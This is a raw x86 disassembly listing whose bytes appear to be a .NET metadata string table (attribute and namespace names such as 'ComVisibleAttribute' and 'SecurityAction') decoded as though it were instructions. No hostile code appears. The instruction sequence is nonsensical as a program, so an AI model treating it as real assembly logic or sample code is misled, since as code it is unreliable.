  4077dc:	popa   
  4077dd:	jae    0x407852
  4077df:	gs ins DWORD PTR es:[edi],dx
  4077e1:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  4077e5:	popa   
  4077e6:	je     0x407850
  4077e8:	add    BYTE PTR [ebx+0x79],dl
  4077eb:	jae    0x407861
  4077ed:	gs ins DWORD PTR es:[edi],dx
  4077ef:	cs push edx
  4077f1:	jne    0x407861
  4077f3:	je     0x40785e
  4077f5:	ins    DWORD PTR es:[edi],dx
  4077f6:	gs cs dec ecx
  4077f9:	outs   dx,BYTE PTR ds:[esi]
  4077fa:	je     0x407861
  4077fc:	jb     0x40786d
  4077fe:	jo     0x407853
  407800:	gs jb  0x407879
  407803:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  40780a:	ins    DWORD PTR es:[edi],dx
  40780b:	push   esi
  40780c:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  407813:	je     0x407889
  407815:	jb     0x407880
  407817:	bound  esi,QWORD PTR [ebp+0x74]
  40781a:	add    BYTE PTR gs:[ebx+0x4c],al
  40781e:	push   ebx
  40781f:	inc    ebx
  407820:	outs   dx,DWORD PTR ds:[esi]
  407821:	ins    DWORD PTR es:[edi],dx
  407822:	jo     0x407890
  407824:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  40782b:	jb     0x407896
  40782d:	bound  esi,QWORD PTR [ebp+0x74]
  407830:	add    BYTE PTR gs:[ecx+0x73],al
  407834:	jae    0x40789b
  407836:	ins    DWORD PTR es:[edi],dx
  407837:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  40783b:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  407843:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40784a:	jae    0x4078bf
  40784c:	gs ins DWORD PTR es:[edi],dx
  40784e:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  407852:	gs jae 0x4078b8
  407855:	jb     0x4078c0
  407857:	jo     0x4078cd
  407859:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407860:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407867:	jae    0x4078dc
  407869:	gs ins DWORD PTR es:[edi],dx
  40786b:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40786f:	gs popaw 
  407872:	jne    0x4078e0
  407874:	je     0x4078b7
  407876:	ins    BYTE PTR es:[edi],dx
  407877:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  40787e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407885:	jae    0x4078fa
  407887:	gs ins DWORD PTR es:[edi],dx
  407889:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  40788d:	outs   dx,DWORD PTR ds:[esi]
  40788e:	ins    DWORD PTR es:[edi],dx
  40788f:	jo     0x4078f2
  407891:	outs   dx,BYTE PTR ds:[esi]
  407892:	jns    0x4078d5
  407894:	je     0x40790a
  407896:	jb     0x407901
  407898:	bound  esi,QWORD PTR [ebp+0x74]
  40789b:	add    BYTE PTR gs:[ecx+0x73],al
  40789f:	jae    0x407906
  4078a1:	ins    DWORD PTR es:[edi],dx
  4078a2:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  4078a6:	jb     0x407917
  4078a8:	fs jne 0x40790e
  4078ab:	je     0x4078ee
  4078ad:	je     0x407923
  4078af:	jb     0x40791a
  4078b1:	bound  esi,QWORD PTR [ebp+0x74]
  4078b4:	add    BYTE PTR gs:[ecx+0x73],al
  4078b8:	jae    0x40791f
  4078ba:	ins    DWORD PTR es:[edi],dx
  4078bb:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  4078bf:	outs   dx,DWORD PTR ds:[esi]
  4078c0:	jo     0x40793b
  4078c2:	jb     0x40792d
  4078c4:	addr16 push 0x74744174
  4078ca:	jb     0x407935
  4078cc:	bound  esi,QWORD PTR [ebp+0x74]
  4078cf:	add    BYTE PTR gs:[ecx+0x73],al
  4078d3:	jae    0x40793a
  4078d5:	ins    DWORD PTR es:[edi],dx
  4078d6:	bound  ebp,QWORD PTR [ecx+edi*2+0x56]
  4078da:	gs jb  0x407950
  4078dd:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  4078e4:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  4078eb:	jae    0x407960
  4078ed:	gs ins DWORD PTR es:[edi],dx
  4078ef:	bound  ebp,QWORD PTR [ecx+edi*2+0x46]
  4078f3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4078fb:	outs   dx,DWORD PTR ds:[esi]
  4078fc:	outs   dx,BYTE PTR ds:[esi]
  4078fd:	inc    ecx
  4078fe:	je     0x407974
  407900:	jb     0x40796b
  407902:	bound  esi,QWORD PTR [ebp+0x74]
  407905:	add    BYTE PTR gs:[ecx+0x73],al
  407909:	jae    0x407970
  40790b:	ins    DWORD PTR es:[edi],dx
  40790c:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  407910:	outs   dx,BYTE PTR ds:[esi]
  407911:	outs   dx,WORD PTR ds:[esi]
  407913:	jb     0x407982
  407915:	popa   
  407916:	je     0x407981
  407918:	outs   dx,DWORD PTR ds:[esi]
  407919:	outs   dx,BYTE PTR ds:[esi]
  40791a:	popa   
  40791b:	ins    BYTE PTR es:[edi],dx
  40791c:	push   esi
  40791d:	gs jb  0x407993
  407920:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407927:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  40792e:	popa   
  40792f:	je     0x407996
  407931:	ins    BYTE PTR es:[edi],dx
  407932:	ins    BYTE PTR es:[edi],dx
  407933:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  40793b:	popa   
  40793c:	arpl   WORD PTR [esi+edx*2+0x65],si
  407940:	jb     0x4079b5
  407942:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407949:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  407950:	gs jne 0x4079c7
  407953:	jb     0x4079b6
  407955:	ins    BYTE PTR es:[edi],dx
  407956:	push   edx
  407957:	gs jae 0x4079c9
  40795a:	jne    0x4079ce
  40795c:	arpl   WORD PTR [ebp+0x73],sp
  40795f:	dec    esp
  407960:	popa   
  407961:	outs   dx,BYTE PTR ds:[esi]
  407962:	addr16 jne 0x4079c6
  407965:	addr16 gs inc ecx
  407968:	je     0x4079de
  40796a:	jb     0x4079d5
  40796c:	bound  esi,QWORD PTR [ebp+0x74]
  40796f:	add    BYTE PTR gs:[ecx+0x73],al
  407973:	jae    0x4079da
  407975:	ins    DWORD PTR es:[edi],dx
  407976:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  40797a:	gs ins BYTE PTR es:[edi],dx
  40797c:	popa   
  40797d:	jns    0x4079d2
  40797f:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  407986:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  40798d:	jae    0x407a02
  40798f:	gs ins DWORD PTR es:[edi],dx
  407991:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  407995:	gs jns 0x4079de
  407998:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4079a0:	bound  esi,QWORD PTR [ebp+0x74]
  4079a3:	add    BYTE PTR gs:[ecx+0x73],al
  4079a7:	jae    0x407a0e
  4079a9:	ins    DWORD PTR es:[edi],dx
  4079aa:	bound  ebp,QWORD PTR [ecx+edi*2+0x53]
  4079ae:	imul   esp,DWORD PTR [edi+0x6e],0x72757461
  4079b5:	gs dec ebx
  4079b7:	gs jns 0x4079fb
  4079ba:	je     0x407a30
  4079bc:	jb     0x407a27
  4079be:	bound  esi,QWORD PTR [ebp+0x74]
  4079c1:	add    BYTE PTR gs:[ebx+0x79],dl
  4079c5:	jae    0x407a3b
  4079c7:	gs ins DWORD PTR es:[edi],dx
  4079c9:	cs push edx
  4079cb:	jne    0x407a3b
  4079cd:	je     0x407a38
  4079cf:	ins    DWORD PTR es:[edi],dx
  4079d0:	gs cs inc ebx
  4079d3:	outs   dx,DWORD PTR ds:[esi]
  4079d4:	ins    DWORD PTR es:[edi],dx
  4079d5:	jo     0x407a40
  4079d7:	ins    BYTE PTR es:[edi],dx
  4079d8:	gs jb  0x407a2e
  4079db:	gs jb  0x407a54
  4079de:	imul   esp,DWORD PTR [ebx+0x65],0x75520073
  4079e5:	outs   dx,BYTE PTR ds:[esi]
  4079e6:	je     0x407a51
  4079e8:	ins    DWORD PTR es:[edi],dx
  4079e9:	gs inc ebx
  4079eb:	outs   dx,DWORD PTR ds:[esi]
  4079ec:	ins    DWORD PTR es:[edi],dx
  4079ed:	jo     0x407a50
  4079ef:	je     0x407a5a
  4079f1:	bound  ebp,QWORD PTR [ecx+0x6c]
  4079f4:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  4079fc:	bound  esi,QWORD PTR [ebp+0x74]
  4079ff:	add    BYTE PTR gs:[ebx+0x79],dl
  407a03:	jae    0x407a79
  407a05:	gs ins DWORD PTR es:[edi],dx
  407a07:	cs push ebx
  407a09:	arpl   WORD PTR gs:[ebp+0x72],si
  407a0d:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x6d726550
  407a15:	imul   esi,DWORD PTR [ebx+0x73],0x736e6f69
  407a1c:	add    BYTE PTR [esi+0x69],al
  407a1f:	ins    BYTE PTR es:[edi],dx
  407a20:	gs dec ecx
  407a22:	dec    edi
  407a23:	push   eax
  407a24:	gs jb  0x407a94
  407a27:	imul   esi,DWORD PTR [ebx+0x73],0x416e6f69
  407a2e:	je     0x407aa4
  407a30:	jb     0x407a9b
  407a32:	bound  esi,QWORD PTR [ebp+0x74]
  407a35:	add    BYTE PTR gs:[ebx+0x65],dl
  407a39:	arpl   WORD PTR [ebp+0x72],si
  407a3c:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x6f697463
  407a44:	outs   dx,BYTE PTR ds:[esi]
  407a45:	add    BYTE PTR [ebx+0x79],dl
  407a48:	jae    0x407abe
  407a4a:	gs ins DWORD PTR es:[edi],dx
  407a4c:	cs inc esp
  407a4e:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407a55:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  407a5c:	jne    0x407ac5
  407a5e:	addr16 popa 
  407a60:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  407a64:	je     0x407ada
  407a66:	jb     0x407ad1
  407a68:	bound  esi,QWORD PTR [ebp+0x74]
  407a6b:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  407a70:	jne    0x407ad9
  407a72:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  407a7a:	jae    0x407a7c
  407a7c:	inc    ebx
  407a7d:	outs   dx,DWORD PTR ds:[esi]
  407a7e:	ins    DWORD PTR es:[edi],dx
  407a7f:	jo     0x407aea
  407a81:	ins    BYTE PTR es:[edi],dx
  407a82:	popa   
  407a83:	je     0x407aee
  407a85:	outs   dx,DWORD PTR ds:[esi]
  407a86:	outs   dx,BYTE PTR ds:[esi]
  407a87:	push   edx
  407a88:	gs ins BYTE PTR es:[edi],dx
  407a8a:	popa   
  407a8b:	js     0x407aee
  407a8d:	je     0x407af8
  407a8f:	outs   dx,DWORD PTR ds:[esi]
  407a90:	outs   dx,BYTE PTR ds:[esi]
  407a91:	jae    0x407ad4
  407a93:	je     0x407b09
  407a95:	jb     0x407b00
  407a97:	bound  esi,QWORD PTR [ebp+0x74]
  407a9a:	add    BYTE PTR gs:[edi+0x63],dh
  407a9e:	popa   
  407a9f:	add    BYTE PTR [edi+0x65],ah
  407aa2:	je     0x407b03
  407aa4:	inc    esi
  407aa5:	jne    0x407b13
  407aa7:	ins    BYTE PTR es:[edi],dx
  407aa8:	dec    esi
  407aa9:	popa   
  407aaa:	ins    DWORD PTR es:[edi],dx
  407aab:	add    BYTE PTR gs:[ebx+0x6f],al
  407aaf:	fs gs dec esi
  407ab2:	popa   
  407ab3:	ins    DWORD PTR es:[edi],dx
  407ab4:	gs jae 0x407b27
  407ab7:	popa   
  407ab8:	arpl   WORD PTR [ebp+0x43],sp
  407abb:	outs   dx,DWORD PTR ds:[esi]
  407abc:	ins    BYTE PTR es:[edi],dx
  407abd:	ins    BYTE PTR es:[edi],dx
  407abe:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407ac3:	outs   dx,BYTE PTR ds:[esi]
  407ac4:	add    BYTE PTR [edi+0x65],ah
  407ac7:	je     0x407b28
  407ac9:	dec    esi
  407aca:	popa   
  407acb:	ins    DWORD PTR es:[edi],dx
  407acc:	gs jae 0x407b3f
  407acf:	popa   
  407ad0:	arpl   WORD PTR [ebp+0x73],sp
  407ad3:	add    BYTE PTR [ecx+0x64],al
  407ad6:	add    BYTE PTR fs:[ebp+0x6e],al
  407ada:	jne    0x407b49
  407adc:	gs jb  0x407b40
  407adf:	je     0x407b50
  407ae1:	jb     0x407ae3
  407ae3:	inc    edi
  407ae4:	gs je  0x407b2c
  407ae7:	outs   dx,BYTE PTR ds:[esi]
  407ae8:	jne    0x407b57
  407aea:	gs jb  0x407b4e
  407aed:	je     0x407b5e
  407aef:	jb     0x407af1
  407af1:	addr16 gs je 0x407b54
  407af5:	inc    ebx
  407af6:	jne    0x407b6a
  407af8:	jb     0x407b5f
  407afa:	outs   dx,BYTE PTR ds:[esi]
  407afb:	je     0x407afd
  407afd:	addr16 gs je 0x407b60
  407b01:	dec    esi
  407b02:	popa   
  407b03:	ins    DWORD PTR es:[edi],dx
  407b04:	add    BYTE PTR gs:[ebp+0x6f],cl
  407b08:	jbe    0x407b6f
  407b0a:	dec    esi
  407b0b:	gs js  0x407b82
  407b0e:	add    BYTE PTR [ecx+0x44],cl
  407b11:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  407b18:	ins    BYTE PTR es:[edi],dx
  407b19:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  407b1e:	jo     0x407b8f
  407b20:	jae    0x407b87
  407b22:	add    BYTE PTR [edi+0x65],ah
  407b25:	je     0x407b86
  407b27:	inc    ebx
  407b28:	outs   dx,DWORD PTR ds:[esi]
  407b29:	jne    0x407b99
  407b2b:	je     0x407b2d
  407b2d:	dec    ebp
  407b2e:	gs ins DWORD PTR es:[edi],dx
  407b30:	bound  esp,QWORD PTR [ebp+0x72]
  407b33:	push   esp
  407b34:	jns    0x407ba6
  407b36:	gs jae 0x407b39
  407b39:	inc    edi
  407b3a:	gs je  0x407b8a
  407b3d:	gs ins DWORD PTR es:[edi],dx
  407b3f:	bound  esp,QWORD PTR [ebp+0x72]
  407b42:	add    BYTE PTR [ebx+0x6f],al
  407b45:	outs   dx,BYTE PTR ds:[esi]
  407b46:	jbe    0x407bad
  407b48:	jb     0x407bbe
  407b4a:	gs jb  0x407bad
  407b4d:	xor    al,BYTE PTR [eax]
  407b4f:	inc    ecx
  407b50:	jb     0x407bc4
  407b52:	popa   
  407b53:	jns    0x407b55
  407b55:	inc    ebx
  407b56:	outs   dx,DWORD PTR ds:[esi]
  407b57:	outs   dx,BYTE PTR ds:[esi]
  407b58:	jbe    0x407bbf
  407b5a:	jb     0x407bd0
  407b5c:	inc    ecx
  407b5d:	ins    BYTE PTR es:[edi],dx
  407b5e:	ins    BYTE PTR es:[edi],dx
  407b5f:	add    BYTE PTR [ecx+0x64],al
  407b62:	fs push edx
  407b64:	popa   
  407b65:	outs   dx,BYTE PTR ds:[esi]
  407b66:	add    BYTE PTR gs:[bx+0x65],al
  407b6b:	je     0x407bba
  407b6d:	gs je  0x407bd8
  407b70:	outs   dx,DWORD PTR ds:[esi]
  407b71:	fs jae 0x407b74
  407b74:	dec    ebp
  407b75:	gs je  0x407be0
  407b78:	outs   dx,DWORD PTR ds:[esi]
  407b79:	fs inc edx
  407b7b:	popa   
  407b7c:	jae    0x407be3
  407b7e:	add    BYTE PTR [edi+0x65],ah
  407b81:	je     0x407be2
  407b83:	dec    ecx
  407b84:	jae    0x407bd9
  407b86:	jo     0x407bed
  407b88:	arpl   WORD PTR [ecx+0x61],bp
  407b8b:	ins    BYTE PTR es:[edi],dx
  407b8c:	dec    esi
  407b8d:	popa   
  407b8e:	ins    DWORD PTR es:[edi],dx
  407b8f:	add    BYTE PTR gs:[edi+0x70],ch
  407b93:	pop    edi
  407b94:	inc    ebp
  407b95:	jno    0x407c0c
  407b97:	popa   
  407b98:	ins    BYTE PTR es:[edi],dx
  407b99:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746567
  407ba1:	dec    ecx
  407ba2:	outs   dx,BYTE PTR ds:[esi]
  407ba3:	jbe    0x407c06
  407ba5:	jb     0x407c10
  407ba7:	popa   
  407ba8:	outs   dx,BYTE PTR ds:[esi]
  407ba9:	je     0x407bee
  407bab:	jne    0x407c19
  407bad:	je     0x407c24
  407baf:	jb     0x407c16
  407bb1:	add    BYTE PTR [ebx+0x74],dl
  407bb4:	jb     0x407c1f
  407bb6:	outs   dx,BYTE PTR ds:[esi]
  407bb7:	add    BYTE PTR [bx+di+0x46],cl
  407bbb:	outs   dx,DWORD PTR ds:[esi]
  407bbc:	jb     0x407c2b
  407bbe:	popa   
  407bbf:	je     0x407c11
  407bc1:	jb     0x407c32
  407bc3:	jbe    0x407c2e
  407bc5:	fs gs jb 0x407bc9
  407bc9:	inc    esi
  407bca:	outs   dx,DWORD PTR ds:[esi]
  407bcb:	jb     0x407c3a
  407bcd:	popa   
  407bce:	je     0x407bd0
  407bd0:	inc    ecx
  407bd1:	jb     0x407c3a
  407bd3:	jne    0x407c42
  407bd5:	outs   dx,BYTE PTR gs:[esi]
  407bd7:	je     0x407c1e
  407bd9:	js     0x407c3e
  407bdb:	gs jo  0x407c52
  407bde:	imul   ebp,DWORD PTR [edi+0x6e],0x646f4300
  407be5:	gs dec esi
  407be7:	popa   
  407be8:	ins    DWORD PTR es:[edi],dx
  407be9:	gs jae 0x407c5c
  407bec:	popa   
  407bed:	arpl   WORD PTR [ebp+0x49],sp
  407bf0:	ins    DWORD PTR es:[edi],dx
  407bf1:	jo     0x407c62
  407bf3:	jb     0x407c69
  407bf5:	inc    ebx
  407bf6:	outs   dx,DWORD PTR ds:[esi]
  407bf7:	ins    BYTE PTR es:[edi],dx
  407bf8:	ins    BYTE PTR es:[edi],dx
  407bf9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407bfe:	outs   dx,BYTE PTR ds:[esi]
  407bff:	add    BYTE PTR [edi+0x65],ah
  407c02:	je     0x407c63
  407c04:	dec    ecx
  407c05:	ins    DWORD PTR es:[edi],dx
  407c06:	jo     0x407c77
  407c08:	jb     0x407c7e
  407c0a:	jae    0x407c0c
  407c0c:	dec    ecx
  407c0d:	outs   dx,BYTE PTR ds:[esi]
  407c0e:	je     0x407c43
  407c10:	xor    al,BYTE PTR [eax]
  407c12:	push   edx
  407c13:	jne    0x407c83
  407c15:	je     0x407c80
  407c17:	ins    DWORD PTR es:[edi],dx
  407c18:	gs push esp
  407c1a:	jns    0x407c8c
  407c1c:	gs dec eax
  407c1e:	popa   
  407c1f:	outs   dx,BYTE PTR ds:[esi]
  407c20:	fs ins BYTE PTR es:[edi],dx
  407c22:	add    BYTE PTR gs:[edi+0x65],al
  407c26:	je     0x407c7c
  407c28:	jns    0x407c9a
  407c2a:	gs inc esi
  407c2c:	jb     0x407c9d
  407c2e:	ins    DWORD PTR es:[edi],dx
  407c2f:	dec    eax
  407c30:	popa   
  407c31:	outs   dx,BYTE PTR ds:[esi]
  407c32:	fs ins BYTE PTR es:[edi],dx
  407c34:	add    BYTE PTR gs:[edi+0x65],ah
  407c38:	je     0x407c99
  407c3a:	dec    esi
  407c3b:	popa   
  407c3c:	ins    DWORD PTR es:[edi],dx
  407c3d:	gs jae 0x407cb0
  407c40:	popa   
  407c41:	arpl   WORD PTR [ebp+0x0],sp
  407c44:	inc    ebx
  407c45:	outs   dx,DWORD PTR ds:[esi]
  407c46:	fs gs dec esi
  407c49:	popa   
  407c4a:	ins    DWORD PTR es:[edi],dx
  407c4b:	gs jae 0x407cbe
  407c4e:	popa   
  407c4f:	arpl   WORD PTR [ebp+0x49],sp
  407c52:	ins    DWORD PTR es:[edi],dx
  407c53:	jo     0x407cc4
  407c55:	jb     0x407ccb
  407c57:	add    BYTE PTR [ebx+0x79],dl
  407c5a:	jae    0x407cd0
  407c5c:	gs ins DWORD PTR es:[edi],dx
  407c5e:	cs inc ebx
  407c60:	outs   dx,DWORD PTR ds:[esi]
  407c61:	ins    DWORD PTR es:[edi],dx
  407c62:	jo     0x407cd3
  407c64:	outs   dx,BYTE PTR ds:[esi]
  407c65:	outs   dx,BYTE PTR gs:[esi]
  407c67:	je     0x407cb6
  407c69:	outs   dx,DWORD PTR ds:[esi]
  407c6a:	fs gs ins BYTE PTR es:[edi],dx
  407c6d:	add    BYTE PTR [ebp+eiz*2+0x73],al
  407c71:	imul   esp,DWORD PTR [edi+0x6e],0x65537265
  407c78:	jb     0x407ce3
  407c7a:	popa   
  407c7b:	ins    BYTE PTR es:[edi],dx
  407c7c:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  407c83:	push   esi
  407c84:	imul   esi,DWORD PTR [ebx+0x69],0x696c6962
  407c8b:	je     0x407d06
  407c8d:	inc    ecx
  407c8e:	je     0x407d04
  407c90:	jb     0x407cfb
  407c92:	bound  esi,QWORD PTR [ebp+0x74]
  407c95:	add    BYTE PTR gs:[ebx+0x79],dl
  407c99:	jae    0x407d0f
  407c9b:	gs ins DWORD PTR es:[edi],dx
  407c9d:	cs push edi
  407c9f:	outs   dx,DWORD PTR ds:[esi]
  407ca0:	jb     0x407d0d
  407ca2:	data16 ins BYTE PTR es:[edi],dx
  407ca4:	outs   dx,DWORD PTR ds:[esi]
  407ca5:	ja     0x407cd5
  407ca7:	inc    ecx
  407ca8:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  407cac:	imul   esi,DWORD PTR [ecx+ebp*2+0x65],0x61430073
  407cb4:	ins    BYTE PTR es:[edi],dx
  407cb5:	ins    BYTE PTR es:[edi],dx
  407cb6:	inc    ebp
  407cb7:	js     0x407d2d
  407cb9:	gs jb  0x407d2a
  407cbc:	popa   
  407cbd:	ins    BYTE PTR es:[edi],dx
  407cbe:	dec    ebp
  407cbf:	gs je  0x407d2a
  407cc2:	outs   dx,DWORD PTR ds:[esi]
  407cc3:	fs inc ecx
  407cc5:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  407cc9:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x74737953
  407cd1:	gs ins DWORD PTR es:[edi],dx
  407cd3:	cs push edi
  407cd5:	outs   dx,DWORD PTR ds:[esi]
  407cd6:	jb     0x407d43
  407cd8:	data16 ins BYTE PTR es:[edi],dx
  407cda:	outs   dx,DWORD PTR ds:[esi]
  407cdb:	ja     0x407d0b
  407cdd:	inc    ebx
  407cde:	outs   dx,DWORD PTR ds:[esi]
  407cdf:	ins    DWORD PTR es:[edi],dx
  407ce0:	jo     0x407d51
  407ce2:	outs   dx,BYTE PTR ds:[esi]
  407ce3:	outs   dx,BYTE PTR gs:[esi]
  407ce5:	je     0x407d34
  407ce7:	outs   dx,DWORD PTR ds:[esi]
  407ce8:	fs gs ins BYTE PTR es:[edi],dx
  407ceb:	add    BYTE PTR [ebp+eiz*2+0x70],al
  407cef:	outs   dx,BYTE PTR gs:[esi]
  407cf1:	fs outs dx,BYTE PTR gs:[esi]
  407cf4:	arpl   WORD PTR [ecx+0x50],di
  407cf7:	jb     0x407d68
  407cf9:	jo     0x407d60
  407cfb:	jb     0x407d71
  407cfd:	jns    0x407cff
  407cff:	push   ebx
  407d00:	jns    0x407d75
  407d02:	je     0x407d69
  407d04:	ins    DWORD PTR es:[edi],dx
  407d05:	cs push edi
  407d07:	outs   dx,DWORD PTR ds:[esi]
  407d08:	jb     0x407d75
  407d0a:	data16 ins BYTE PTR es:[edi],dx
  407d0c:	outs   dx,DWORD PTR ds:[esi]
  407d0d:	ja     0x407d3d
  407d0f:	inc    ebx
  407d10:	outs   dx,DWORD PTR ds:[esi]
  407d11:	ins    DWORD PTR es:[edi],dx
  407d12:	jo     0x407d83
  407d14:	outs   dx,BYTE PTR ds:[esi]
  407d15:	outs   dx,BYTE PTR gs:[esi]
  407d17:	je     0x407d66
  407d19:	outs   dx,DWORD PTR ds:[esi]
  407d1a:	fs gs ins BYTE PTR es:[edi],dx
  407d1d:	cs inc esp
  407d1f:	gs jae 0x407d8b
  407d22:	outs   dx,BYTE PTR ds:[si]
  407d24:	add    BYTE PTR [ecx+0x63],al
  407d27:	je     0x407d92
  407d29:	jbe    0x407d94
  407d2b:	je     0x407da6
  407d2d:	push   esp
  407d2e:	outs   dx,DWORD PTR ds:[esi]
  407d2f:	outs   dx,DWORD PTR ds:[esi]
  407d30:	ins    BYTE PTR es:[edi],dx
  407d31:	bound  ebp,QWORD PTR [edi+0x78]
  407d34:	dec    ecx
  407d35:	je     0x407d9c
  407d37:	ins    DWORD PTR es:[edi],dx
  407d38:	add    BYTE PTR [ebx+0x79],dl
  407d3b:	jae    0x407db1
  407d3d:	gs ins DWORD PTR es:[edi],dx
  407d3f:	cs push edi
  407d41:	outs   dx,DWORD PTR ds:[esi]
  407d42:	jb     0x407daf
  407d44:	data16 ins BYTE PTR es:[edi],dx
  407d46:	outs   dx,DWORD PTR ds:[esi]
  407d47:	ja     0x407d77
  407d49:	inc    ebx
  407d4a:	outs   dx,DWORD PTR ds:[esi]
  407d4b:	ins    DWORD PTR es:[edi],dx
  407d4c:	jo     0x407dbd
  407d4e:	outs   dx,BYTE PTR ds:[esi]
  407d4f:	outs   dx,BYTE PTR gs:[esi]
  407d51:	je     0x407da0
  407d53:	outs   dx,DWORD PTR ds:[esi]
  407d54:	fs gs ins BYTE PTR es:[edi],dx
  407d57:	cs inc ebx
  407d59:	outs   dx,DWORD PTR ds:[esi]
  407d5a:	ins    DWORD PTR es:[edi],dx
  407d5b:	jo     0x407dc6
  407d5d:	ins    BYTE PTR es:[edi],dx
  407d5e:	gs jb  0x407d61
  407d61:	push   esi
  407d62:	popa   
  407d63:	ins    BYTE PTR es:[edi],dx
  407d64:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x4f6e6f69
  407d6c:	jo     0x407de2
  407d6e:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407d75:	imul   esp,DWORD PTR [edx+0x75],0x43006574
  407d7c:	outs   dx,DWORD PTR ds:[esi]
  407d7d:	fs gs push esp
  407d80:	jns    0x407df2
  407d82:	gs dec ebp
  407d84:	gs ins DWORD PTR es:[edi],dx
  407d86:	bound  esp,QWORD PTR [ebp+0x72]
  407d89:	add    BYTE PTR [ebp+0x65],cl
  407d8c:	ins    DWORD PTR es:[edi],dx
  407d8d:	bound  esp,QWORD PTR [ebp+0x72]
  407d90:	inc    ecx
  407d91:	je     0x407e07
  407d93:	jb     0x407dfe
  407d95:	bound  esi,QWORD PTR [ebp+0x74]
  407d98:	gs jae 0x407d9b
  407d9b:	jae    0x407e02
  407d9d:	je     0x407dfe
  407d9f:	inc    ecx
  407da0:	je     0x407e16
  407da2:	jb     0x407e0d
  407da4:	bound  esi,QWORD PTR [ebp+0x74]
  407da7:	gs jae 0x407daa
  407daa:	inc    ebx
  407dab:	outs   dx,DWORD PTR ds:[esi]
  407dac:	fs gs push esp
  407daf:	jns    0x407e21
  407db1:	gs dec ebp
  407db3:	gs ins DWORD PTR es:[edi],dx
  407db5:	bound  esp,QWORD PTR [ebp+0x72]
  407db8:	inc    ebx
  407db9:	outs   dx,DWORD PTR ds:[esi]
  407dba:	ins    BYTE PTR es:[edi],dx
  407dbb:	ins    BYTE PTR es:[edi],dx
  407dbc:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407dc1:	outs   dx,BYTE PTR ds:[esi]
  407dc2:	add    BYTE PTR [edi+0x65],ah
  407dc5:	je     0x407e26
  407dc7:	dec    ebp
  407dc8:	gs ins DWORD PTR es:[edi],dx
  407dca:	bound  esp,QWORD PTR [ebp+0x72]
  407dcd:	jae    0x407dcf
  407dcf:	jae    0x407e36
  407dd1:	je     0x407e32
  407dd3:	dec    esi
  407dd4:	popa   
  407dd5:	ins    DWORD PTR es:[edi],dx
  407dd6:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  407ddb:	gs inc ecx
  407ddd:	je     0x407e53
  407ddf:	jb     0x407e4a
  407de1:	bound  esi,QWORD PTR [ebp+0x74]
  407de4:	gs jae 0x407de7
  407de7:	jae    0x407e4e
  407de9:	je     0x407e4a
  407deb:	push   esp
  407dec:	jns    0x407e5e
  407dee:	gs inc ecx
  407df0:	je     0x407e66
  407df2:	jb     0x407e5d
  407df4:	bound  esi,QWORD PTR [ebp+0x74]
  407df7:	gs jae 0x407dfa
  407dfa:	jae    0x407e61
  407dfc:	je     0x407e5d
  407dfe:	dec    ecx
  407dff:	jae    0x407e51
  407e01:	popa   
  407e02:	jb     0x407e78
  407e04:	imul   esp,DWORD PTR [ecx+0x6c],0x646f4300
  407e0b:	gs push esp
  407e0d:	jns    0x407e7f
  407e0f:	gs push edx
  407e11:	gs data16 gs jb 0x407e7b
  407e16:	outs   dx,BYTE PTR ds:[esi]
  407e17:	arpl   WORD PTR [ebp+0x43],sp
  407e1a:	outs   dx,DWORD PTR ds:[esi]
  407e1b:	ins    BYTE PTR es:[edi],dx
  407e1c:	ins    BYTE PTR es:[edi],dx
  407e1d:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407e22:	outs   dx,BYTE PTR ds:[esi]
  407e23:	add    BYTE PTR [edi+0x65],ah
  407e26:	je     0x407e87
  407e28:	inc    edx
  407e29:	popa   
